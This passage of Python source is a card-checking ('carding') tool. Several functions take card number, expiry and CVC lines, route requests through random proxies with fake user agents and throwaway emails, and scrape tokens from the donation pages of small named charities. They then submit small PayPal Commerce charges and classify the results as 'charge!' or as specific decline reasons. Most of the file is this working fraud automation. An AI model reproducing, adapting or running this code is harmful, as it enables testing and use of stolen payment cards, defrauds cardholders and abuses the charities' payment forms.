					    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
					    'content-type': data.content_type,
					    'origin': 'https://peyoteway.org',
					    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
					    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
					    'sec-ch-ua-mobile': '?1',
					    'sec-ch-ua-platform': '"Android"',
					    'sec-fetch-dest': 'empty',
					    'sec-fetch-mode': 'cors',
					    'sec-fetch-site': 'same-origin',
					    'user-agent': user
					}
					
					params = {
					    'action': 'give_paypal_commerce_create_order',
					}
					
					response = r.post(
					    'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
					    params=params,
					    cookies=r.cookies,
					    headers=headers,
					    data=data,
					)
					res=json.loads(response.text)
					if res.get("success") is True:
						ids = json.loads(response.text).get("data",{}).get("id")
						headers = {
						    'authority': 'cors.api.paypal.com',
						    'accept': '*/*',
						    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
						    'authorization': f'Bearer {toks}',
						    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
						    'content-type': 'application/json',
						    'origin': 'https://assets.braintreegateway.com',
						    'referer': 'https://assets.braintreegateway.com/',
						    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
						    'sec-ch-ua-mobile': '?1',
						    'sec-ch-ua-platform': '"Android"',
						    'sec-fetch-dest': 'empty',
						    'sec-fetch-mode': 'cors',
						    'sec-fetch-site': 'cross-site',
						    'user-agent': user
						}
						
						json_data = {
						    'payment_source': {
						        'card': {
						            'number': cc,
						            'expiry': f'20{yy[-2:]}-{mm.zfill(2)}',
						            'security_code': cvc,
						            'attributes': {
						                'verification': {
						                    'method': 'SCA_WHEN_REQUIRED',
						                },
						            },
						        },
						    },
						    'application_context': {
						        'vault': False,
						    },
						}
						
						response = r.post(
						    f'https://cors.api.paypal.com/v2/checkout/orders/{ids}/confirm-payment-source',
						    headers=headers,
						    json=json_data,
						)
						data=json.loads(response.text)
						#response
						if data.get("status") == "APPROVED":
							ord=data.get('id')
							print(ord)
							data = MultipartEncoder({
							    'give-honeypot': (None, ''),
							    'give-form-id-prefix': (None, pref),
							    'give-form-id': (None, fid),
							    'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
							    'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
							    'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
							    'give-form-minimum': (None, '1.00'),
							    'give-form-maximum': (None, '999999.99'),
							    'give-form-hash': (None, hase),
							    'give-price-id': (None, 'custom'),
							    'give-recurring-logged-in-only': (None, ''),
							    'give-logged-in-only': (None, '1'),
							    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
							    'give-amount': (None, '1.00'),
							    'give-radio-donation-level': (None, 'custom'),
							    'payment-mode': (None, 'paypal-commerce'),
							    'give_first': (None, 'raph'),
							    'give_last': (None, 'raph'),
							    'give_email': (None, acc),
							    'give_comment': (None, ''),
							    'card_name': (None, 'Raphael'),
							    'card_exp_month': (None, ''),
							    'card_exp_year': (None, ''),
							    'give-gateway': (None, 'paypal-commerce'),
							})
							headers = {
							    'authority': 'peyoteway.org',
							    'accept': '*/*',
							    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
							    'content-type': data.content_type,
							
							    'origin': 'https://peyoteway.org',
							    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
							    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
							    'sec-ch-ua-mobile': '?1',
							    'sec-ch-ua-platform': '"Android"',
							    'sec-fetch-dest': 'empty',
							    'sec-fetch-mode': 'cors',
							    'sec-fetch-site': 'same-origin',
							    'user-agent': user
							}
							
							params = {
							    'action': 'give_paypal_commerce_approve_order',
							    'order': ord,
							}
							
							response = r.post(
							    'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
							    params=params,
							    cookies=r.cookies,
							    headers=headers,
							    data=data,
							)
							js=json.loads(response.text)
							if 'error' in js['data']:
								dt=js['data']['error']
								if 'RESTRICTED_OR_INACTIVE_ACCOUNT.' in dt :
									return 'RESTRICTED_OR_INACTIVE_ACCOUNT.'
								elif 'INVALID_OR_RESTRICTED_CARD' in dt:
									return 'INVALID_OR_RESTRICTED_CARD'
								elif 'DECLINED_PLEASE_RETRY.' in dt:
									return 'DECLINED_PLEASE_RETRY.'
								elif 'SUSPECTED_FRAUD.' in dt:
									return 'SUSPECTED_FRAUD.'
								elif 'ACCOUNT_BLOCKED_BY_ISSUER.' in dt:
									return 'ACCOUNT_BLOCKED_BY_ISSUER.'
								elif 'GENERIC_DECLINE.' in dt:
									return 'GENERIC_DECLINE.'
								elif 'SECURITY_VIOLATION' in dt:
									return 'SECURITY_VIOLATION'
								elif 'INSUFFICIENT_FUNDS.' in dt:
									return 'INSUFFICIENT_FUNDS.'
								elif 'REATTEMPT_NOT_PERMITTED.' in dt:
									return 'REATTEMPT_NOT_PERMITTED.' 
								elif 'INVALID_ACCOUNT.' in dt:
									return 'INVALID_ACCOUNT.' 
								elif 'ACCOUNT_CLOSED.' in dt:
									return 'ACCOUNT_CLOSED.' 
								elif 'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER.' in dt:
									return 'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER.' 
								elif 'CVV2_FAILURE.' in dt:
									return 'CVV2_FAILURE.' 
								elif 'DO_NOT_HONOR.' in dt:
									return 'DO_NOT_HONOR.' 
								elif 'ACCOUNT_NOT_FOUND.' in dt:
									return 'ACCOUNT_NOT_FOUND.'
								elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT.' in dt:
									return 'DECLINED_DUE_TO_UPDATED_ACCOUNT.'
								elif 'TRANSACTION_NOT_PERMITTED.' in dt:
									return 'TRANSACTION_NOT_PERMITTED.' 
								elif 'PICKUP_CARD_SPECIAL_CONDITIONS.' in dt:
									return 'PICKUP_CARD_SPECIAL_CONDITIONS.'
								elif 'LOST_OR_STOLEN.' in dt:
									return 'LOST_OR_STOLEN.'
								elif 'INVALID_MERCHANT.' in dt:
									return 'INVALID_MERCHANT.'
								elif 'For Visa, Mastercard, or Discover transactions, nothing matches. For American Express card holder, the address and postal code are both incorrect. For Visa, Mastercard, Discover, or American Express, the CVV2/CSC does not match. EXPIRED_CARD.' in dt:
									return 'CVV2/CSC does not match.'
								elif 'TRANSACTION_CANNOT_BE_COMPLETED.' in dt:
									return 'TRANSACTION_CANNOT_BE_COMPLETED.'
								elif 'AMOUNT_EXCEEDED.' in dt:
									return 'AMOUNT_EXCEEDED.'
								elif js['data']['error']['details'][0]['issue']:
									return js['data']['error']['details'][0]['issue']
							else:
								if js.get("success") == True or js.get("success"):
									return "Charge !"
								else:
									return js
						else:
							data = json.loads(response.text)
							if data.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue"):
								sj=data["data"]["error"]["details"][0]["issue"]
								return sj
							if data.get("details", [{}])[0].get("issue"):
								dis =data.get("details", [{}])[0].get("issue")
								return dis
							else:
								if 'PAYER_ACTION_REQUIRED' in data:
									return 'PAYER_ACTION_REQUIRED'
								elif data['status']:
									return data['status']
								else:
									return data
			
					else:
						print(f"NOT_SUCCESS")
					exit()
				
				else:
					print("REQUESTS_NOT_SUCCESS")
			else:
				print("TOKEN_ERROR_REQUESTS")


def ppc001(ccx):#(ccx,amount):
	card = ccx.strip()
	if not card:
		print('Skiped')
		pass
		
	else:
		parts = re.split(r'[:|/\\]', card)
		n = parts[0]
		mm = parts[1]
		yy = parts[2]
		cvc = parts[3]
		proxies_list = load_proxies("proxies.txt")
		proxy_line = random.choice(proxies_list)
		proxies = build_proxy(proxy_line)
		def generate_random_account():
			name = ''.join(random.choices(string.ascii_lowercase, k=20))
			number = ''.join(random.choices(string.digits, k=4))
			return f"{name}{number}@yahoo.com"
		acc = generate_random_account()
		r=requests.Session()
		r.proxies.update(proxies)
		ua=UserAgent()
		user=ua.chrome
		headers = {
		    'authority': 'dissertation-editor.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'cache-control': 'max-age=0',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'none',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': user,
		}
		
		response = r.get('https://dissertation-editor.com/paypal/',  headers=headers,timeout=60)
		text=response.text
		form_id=re.search(r'name="wpforms\[id\]"\s+value="(\d+)"', text).group(1)
		pid=re.search(r'name="page_id"\s+value="(\d+)"', text).group(1)
		post_id=re.search(r'name="wpforms\[post_id\]".*?value="([^"]+)"', text).group(1)
		noc=re.search(r'"nonces"\s*:\s*\{\s*"create"\s*:\s*"([^"]+)"', text).group(1)
		enc_token = re.search(r'data-client-token="([^"]+)"', text)
		dec = base64.b64decode(enc_token.group(1)).decode('utf-8')
		toks = re.search(r'"accessToken":"(.*?)"', dec).group(1)
		dtk= re.search(r'<form[^>]*data-token="([^"]+)"', response.text).group(1)
		
		data =MultipartEncoder({
		    'wpforms[fields][1][]': (None, 'I agree to the <a href="/terms-and-conditions/" style="color: #188bf6">terms and conditions</a>'),
		    'wpforms[fields][2][first]': (None, 'raph'),
		    'wpforms[fields][2][last]': (None, 'raph'),
		    'wpforms[fields][3]': (None, ''),
		    'wpforms[fields][4]': (None, acc),
		    'wpforms[fields][11]': (None, '10080'),
		    'wpforms[fields][6]': (None, 'For you'),
		    'wpforms[fields][9]': (None, '5.00'),
		    'wpforms[fields][5]': (None, ''),
		    'wpforms[fields][12][orderID]': (None, ''),
		    'wpforms[fields][12][subscriptionID]': (None, ''),
		    'wpforms[fields][12][source]': (None, ''),
		    'wpforms[id]': (None, form_id),
		    'page_title': (None, 'Paypal'),
		    'page_url': (None, 'https://dissertation-editor.com/paypal/'),
		    'url_referer': (None, ''),
		    'page_id': (None, pid),
		    'wpforms[post_id]': (None, post_id),
		    'total': (None, '1'),
		    'is_checkout': (None, 'false'),
		    'nonce': (None, noc),
		})
		headers = {
		    'authority': 'dissertation-editor.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': data.content_type,
		    'origin': 'https://dissertation-editor.com',
		    'referer': 'https://dissertation-editor.com/paypal/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		}
		
		params = {
		    'action': 'wpforms_paypal_commerce_create_order',
		}
		
		
		
		response = r.post(
		    'https://dissertation-editor.com/wp-admin/admin-ajax.php',
		    params=params,
		    cookies=r.cookies,
		    headers=headers,
		    data=data,timeout=60
		)
		
		oid=json.loads(response.text)
		if "data" in oid:
			ids=oid["data"]["id"]
			headers = {
			    'authority': 'cors.api.paypal.com',
			    'accept': '*/*',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'authorization': f'Bearer {toks}',
			    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
			    'content-type': 'application/json',
			    'origin': 'https://assets.braintreegateway.com',
			    'referer': 'https://assets.braintreegateway.com/',
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'cross-site',
			    'user-agent': user,
			}
			
			json_data = {
			    'payment_source': {
			        'card': {
			            'number': n,
			            'expiry': f'20{yy[-2:]}-{mm.zfill(2)}',
			            'security_code': cvc,
			            'attributes': {
			                'verification': {
			                    'method': 'SCA_WHEN_REQUIRED',
			                },
			            },
			        },
			    },
			    'application_context': {
			        'vault': False,
			    },
			}
			
			response = requests.post(f'https://cors.api.paypal.com/v2/checkout/orders/{ids}/confirm-payment-source',headers=headers,json=json_data,timeout=60)
			ord=json.loads(response.text)
			if ord.get("status") == "APPROVED":
				order_id = ord["id"]
				start_timestamp = int(time.time())
				end_timestamp = start_timestamp + 120
				data = MultipartEncoder({
				    'wpforms[fields][1][]': (None, 'I agree to the <a href="/terms-and-conditions/" style="color: #188bf6">terms and conditions</a>'),
				    'wpforms[fields][2][first]': (None, 'raph'),
				    'wpforms[fields][2][last]': (None, 'raph'),
				    'wpforms[fields][3]': (None, ''),
				    'wpforms[fields][4]': (None, acc),
				    'wpforms[fields][11]': (None, '10080'),
				    'wpforms[fields][6]': (None, 'For you'),
				    'wpforms[fields][9]': (None, '5.00'),
				    'wpforms[fields][5]': (None, ''),
				    'wpforms[fields][12][orderID]': (None, order_id),
				    'wpforms[fields][12][subscriptionID]': (None, ''),
				    'wpforms[fields][12][source]': (None, ''),
				    'wpforms[id]': (None, form_id),
				    'page_title': (None, 'Paypal'),
				    'page_url': (None, 'https://dissertation-editor.com/paypal/'),
				    'url_referer': (None, ''),
				    'page_id': (None, pid),
				    'wpforms[post_id]': (None, post_id),
				    'wpforms[token]': (None, dtk),
				    'action': (None, 'wpforms_submit'),
				    'start_timestamp': (None, str(start_timestamp)),
				    'end_timestamp': (None, str(end_timestamp)),
				})
				headers = {
				    'authority': 'dissertation-editor.com',
				    'accept': 'application/json, text/javascript, */*; q=0.01',
				    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				    'content-type': data.content_type,
				    'origin': 'https://dissertation-editor.com',
				    'referer': 'https://dissertation-editor.com/paypal/',
				    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
				    'sec-ch-ua-mobile': '?1',
				    'sec-ch-ua-platform': '"Android"',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': user,
				    'x-requested-with': 'XMLHttpRequest',
				}
				
		
				
				response = r.post('https://dissertation-editor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data,timeout=60)
				msg = re.search(r'<p[^>]*>(.*?)<\\/p>', response.text, re.DOTALL)
				try:
					js=json.loads(response.text)
				except:
					js =response.text
				if js.get("success") is True and "confirmation" in js.get("data", {}) or 'Thank' in response.text or 'THANK'in response.text or 'thanks' in response.text or 'Thank' in response.text:
					return 'charge!'
				elif "This payment cannot be processed because it was declined by payment processor." in msg.group(1).strip():
					return 'Declined by payment processor'
				elif "This payment cannot be processed because there was an error with the capture order API call." in response.text:
					return 'CAPTURE_ORDER_ERROR'
				else:
					if "Sorry" in js["data"]["errors"]["general"]["footer"]:
						return js["data"]["errors"]["general"]["footer"]
					else:
						return response.text
				if ord.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue"):
					return ord.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue")
				elif ord.get("status") == "PAYER_ACTION_REQUIRED":
					return '3D_SECURE_REQUIRED'
				else:
					if "Sorry" in ord["data"]["errors"]["general"]["footer"]:
						return ord["data"]["errors"]["general"]["footer"]
					else:
						return data
			else:
				dt=json.loads(response.text)
				try:
					if dt['details'][0]['issue']:
						return dt['details'][0]['issue']
					else:
						if "Sorry" in dt["data"]["errors"]["general"]["footer"]:
							return dt["data"]["errors"]["general"]["footer"]
						else:
							return dt
				except Exception as e :
					return e
		
		else:
			return "ERROR_IN_DATA"



def ppc2(ccx):
	r=requests.Session()
	card = ccx.strip()
	if not card:
		print('Skiped')
		return 
		
	else:
		parts = re.split(r'[:|/\\]', card)
		n = parts[0]
		mm = parts[1]
		yy = parts[2]
		cvc = parts[3]
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f'{name}{number}@yahoo.com'
	acc = generate_random_account()
	ua = UserAgent()
	user = ua.random
	headers = {
	    'authority': 'australiancatholichistoricalsociety.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://australiancatholichistoricalsociety.com.au/about/donate/', headers=headers)
	text=response.text
	form_id=re.search(r'name="wpforms\[id\]"\s+value="(\d+)"', text).group(1)
	pid=re.search(r'name="page_id"\s+value="(\d+)"', text).group(1)
	post_id=re.search(r'name="wpforms\[post_id\]".*?value="([^"]+)"', text).group(1)
	noc=re.search(r'"nonces"\s*:\s*\{\s*"create"\s*:\s*"([^"]+)"', text).group(1)
	enc_token = re.search(r'data-client-token="([^"]+)"', text)
	if enc_token:
		dec = base64.b64decode(enc_token.group(1)).decode('utf-8')
		toks = re.search(r'"accessToken":"(.*?)"', dec).group(1)
		dtk= re.search(r'<form[^>]*data-token="([^"]+)"', response.text).group(1)
		data = MultipartEncoder({
		    'wpforms[fields][1][first]': (None, 'raph'),
		    'wpforms[fields][1][last]': (None, 'raph'),
		    'wpforms[fields][2]': (None, acc),
		    'wpforms[fields][8]': (None, 'No Reason'),
		    'wpforms[fields][3]': (None, '5.00'),
		    'wpforms[fields][4]': (None, ''),
		    'wpforms[fields][7][orderID]': (None, ''),
		    'wpforms[fields][7][subscriptionID]': (None, ''),
		    'wpforms[fields][7][source]': (None, ''),
		    'wpforms[fields][7][cardname]': (None, 'raphael'),
		    'wpforms[id]': (None, form_id),
		    'page_title': (None, 'Donate'),
		    'page_url': (None, 'https://thebowlbycentre.org.uk/donate/'),
		    'url_referer': (None, ''),
		    'page_id': (None, pid),
		    'wpforms[post_id]': (None, post_id),
		    'total': (None, '5'),
		    'is_checkout': (None, 'false'),
		    'nonce': (None, noc),
		})
		headers = {
		    'authority': 'australiancatholichistoricalsociety.com.au',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': data.content_type,
		    'origin': 'https://thebowlbycentre.org.uk',
		    'referer': 'https://thebowlbycentre.org.uk/donate/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		}
		
		params = {
		    'action': 'wpforms_paypal_commerce_create_order',
		}
		
		
		
		response = r.post(
		    'https://australiancatholichistoricalsociety.com.au/wp-admin/admin-ajax.php',
		    params=params,
		    cookies=r.cookies,
		    headers=headers,
		    data=data,
		)
		if response.json().get("success") is True:
		    id =response.json()["data"]["id"]
		    headers = {
			    'authority': 'cors.api.paypal.com',
			    'accept': '*/*',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'authorization': f'Bearer {toks}',
			    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
			    'content-type': 'application/json',
			    'origin': 'https://assets.braintreegateway.com',
			    'referer': 'https://assets.braintreegateway.com/',
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'cross-site',
			    'user-agent': user,
			}
			
		    json_data = {
			    'payment_source': {
			        'card': {
			            'number': n,
			            'expiry': f'20{yy[-2:]}-{mm.zfill(2)}',
			            'security_code': cvc,
			            'name': 'raphael',
			            'attributes': {
			                'verification': {
			                    'method': 'SCA_WHEN_REQUIRED',
			                },
			            },
			        },
			    },
			    'application_context': {
			        'vault': False,
			    },
			}
			
		    response = r.post(
			    f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
			    headers=headers,
			    json=json_data,
			)
		    ord=json.loads(response.text)
		    if ord.get("status") == "APPROVED":
		    	order_id = ord["id"]
		    	start_timestamp = int(time.time())
		    	end_timestamp = start_timestamp + 120
		    	paydata = MultipartEncoder({
			    'wpforms[fields][1][first]': (None, 'raph'),
			    'wpforms[fields][1][last]': (None, 'raph'),
			    'wpforms[fields][2]': (None, acc),
			    'wpforms[fields][8]': (None, 'No Reason'),
			    'wpforms[fields][3]': (None, '5.00'),
			    'wpforms[fields][4]': (None, ''),
			    'wpforms[fields][7][orderID]': (None, order_id),
			    'wpforms[fields][7][subscriptionID]': (None, ''),
			    'wpforms[fields][7][source]': (None, ''),
			    'wpforms[fields][7][cardname]': (None, 'raphael'),
			    'wpforms[id]': (None, form_id),
			    'page_title': (None, 'Donate'),
			    'page_url': (None, 'https://thebowlbycentre.org.uk/donate/'),
			    'url_referer': (None, ''),
			    'page_id': (None, pid),
			    'wpforms[post_id]': (None, post_id),
			    'wpforms[token]': (None, dtk),
			    'action': (None, 'wpforms_submit'),
			    'start_timestamp': (None, f'{start_timestamp}'),
			    'end_timestamp': (None, f'{end_timestamp}'),
			})
		    	headers = {
			    'authority': 'thebowlbycentre.org.uk',
			    'accept': 'application/json, text/javascript, */*; q=0.01',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'content-type': paydata.content_type,
			    'origin': 'https://thebowlbycentre.org.uk',
			    'referer': 'https://thebowlbycentre.org.uk/donate/',
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': user,
			    'x-requested-with': 'XMLHttpRequest',
			}
		    	response = r.post('https://australiancatholichistoricalsociety.com.au/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=paydata)
		    	try:
		    		js=json.loads(response.text)
		    	except:
		    		js =response.text
		    	if js.get("success") is True and "confirmation" in js.get("data", {}) or 'Thank' in response.text or 'THANK'in response.text or 'thanks' in response.text or 'Thank' in response.text:
		    		return 'charge!'
		    	else:
		    		return "Not_Charge"
	#not approved
		    else:
		    	return 'Not_Approved'
		else:
		    ord2=response.text
		    if ord2.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue"):
		    	return ord2.get("data", {}).get("error", {}).get("details", [{}])[0].get("issue")
		    elif ord2.get("data", {}).get("errors", {}).get("details", [{}])[0].get("issue"):
		    	return ord2.get("data", {}).get("errors", {}).get("details", [{}])[0].get("issue")
		    elif ord2.get("status") == "PAYER_ACTION_REQUIRED":
		    	return '3D_SECURE_REQUIRED'
		    else:
		    	return 'Card_Issus'
	else:
		return "No_Accsess_Token"